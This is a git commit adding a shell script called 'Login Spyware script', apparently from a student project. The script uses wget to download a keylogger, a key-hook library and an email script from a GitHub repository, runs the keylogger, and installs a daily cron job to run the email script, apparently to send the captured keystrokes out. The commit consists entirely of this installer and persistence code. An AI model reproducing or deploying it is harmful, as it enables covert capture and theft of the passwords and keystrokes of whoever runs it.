504d2c8f8a4ad31e393823eb90f4a08a24cada7f
albatujani <48261658+albatujani@users.noreply.github.com>
2019-03-06 00:26:23 +0100

    Login Spyware script

---
+++ loginspyware/final.sh
@@ -0,0 +1,16 @@
+#!/bin/sh -e
+
+
+wget https://raw.githubusercontent.com/albatujani/OS_FTI_Project/master/loginspyware/email.sh  -P ~/Downloads
+wget https://raw.githubusercontent.com/albatujani/OS_FTI_Project/master/loginspyware/keylogger.py  -P ~/Downloads
+wget https://raw.githubusercontent.com/albatujani/OS_FTI_Project/master/loginspyware/pyxhook.py -P ~/Downloads
+chmod +x ~/Downloads/email.sh
+
+python ~/Downloads/keylogger.py
+
+#install new cron file
+crontab mycron
+
+crontab -l | echo "24 00 * * * bash ~/Downloads/email.sh" | crontab -
+
+exit 0
